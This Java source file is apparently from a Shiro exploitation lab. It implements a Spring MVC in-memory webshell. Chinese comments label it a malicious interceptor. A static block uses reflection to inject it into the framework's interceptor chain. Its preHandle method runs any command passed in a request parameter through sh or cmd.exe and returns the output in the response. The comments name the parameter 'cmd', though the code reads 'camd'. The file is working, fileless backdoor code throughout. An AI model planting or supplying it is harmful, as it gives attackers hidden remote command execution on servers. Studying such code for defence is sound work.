package com.example.shirolab.web.interceptor;

import org.springframework.web.context.WebApplicationContext;
import org.springframework.web.context.request.RequestContextHolder;
import org.springframework.web.servlet.HandlerInterceptor;
import org.springframework.web.servlet.ModelAndView;
import org.springframework.web.servlet.handler.AbstractHandlerMapping;
import org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping;

import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.InputStream;
import java.lang.reflect.Field;
import java.util.List;
import java.util.Scanner;

/**
 * 恶意拦截器 - Spring内存马
 * 通过反射注入到Spring MVC的拦截器链中
 * 访问任意URL时，如果带有cmd参数就会执行命令
 */
public class InjectInterceptor implements HandlerInterceptor {
    
    static {
        try {
            // 获取Spring上下文
            WebApplicationContext context = (WebApplicationContext) RequestContextHolder.currentRequestAttributes()
                    .getAttribute("org.springframework.web.servlet.DispatcherServlet.CONTEXT", 0);
            
            // 获取RequestMappingHandlerMapping - 明确指定bean名称
            RequestMappingHandlerMapping mappingHandlerMapping = context.getBean("requestMappingHandlerMapping", RequestMappingHandlerMapping.class);
            
            // 通过反射获取adaptedInterceptors字段
            Field field = AbstractHandlerMapping.class.getDeclaredField("adaptedInterceptors");
            field.setAccessible(true);
            
            // 获取拦截器列表
            List<HandlerInterceptor> adaptInterceptors = (List<HandlerInterceptor>) field.get(mappingHandlerMapping);
            
            // 注入恶意拦截器
            InjectInterceptor evilInterceptor = new InjectInterceptor();
            adaptInterceptors.add(evilInterceptor);
            
            System.out.println("[InjectInterceptor] 恶意拦截器注入成功！");
        } catch (Exception e) {
            System.err.println("[InjectInterceptor] 注入失败: " + e.getMessage());
            e.printStackTrace();
        }
    }

    @Override
    public boolean preHandle(HttpServletRequest request, HttpServletResponse response, Object handler) throws Exception {
        // 检查是否有cmd参数
        String cmd = request.getParameter("camd");
        if (cmd != null) {
            try {
                System.out.println("[InjectInterceptor] 执行命令: " + cmd);
                
                // 判断操作系统类型
                boolean isLinux = true;
                String osType = System.getProperty("os.name");
                if (osType != null && osType.toLowerCase().contains("win")) {
                    isLinux = false;
                }
                
                // 构建命令数组
                String[] cmds = isLinux ? 
                    new String[]{"sh", "-c", cmd} : 
                    new String[]{"cmd.exe", "/c", cmd};
                
                // 执行命令
                InputStream in = Runtime.getRuntime().exec(cmds).getInputStream();
                Scanner s = new Scanner(in).useDelimiter("\\A");
                String output = s.hasNext() ? s.next() : "";
                
                // 输出结果
                response.getWriter().write(output);
                response.getWriter().flush();
                response.getWriter().close();
                
                System.out.println("[InjectInterceptor] 命令执行完成");
            } catch (Exception e) {
                System.err.println("[InjectInterceptor] 命令执行失败: " + e.getMessage());
                e.printStackTrace();
            }
            return false; // 阻止继续处理
        }
        return true; // 继续正常处理
    }

    @Override
    public void postHandle(HttpServletRequest request, HttpServletResponse response, Object handler, ModelAndView modelAndView) throws Exception {
        HandlerInterceptor.super.postHandle(request, response, handler, modelAndView);
    }

    @Override
    public void afterCompletion(HttpServletRequest request, HttpServletResponse response, Object handler, Exception ex) throws Exception {
        HandlerInterceptor.super.afterCompletion(request, response, handler, ex);
    }
}
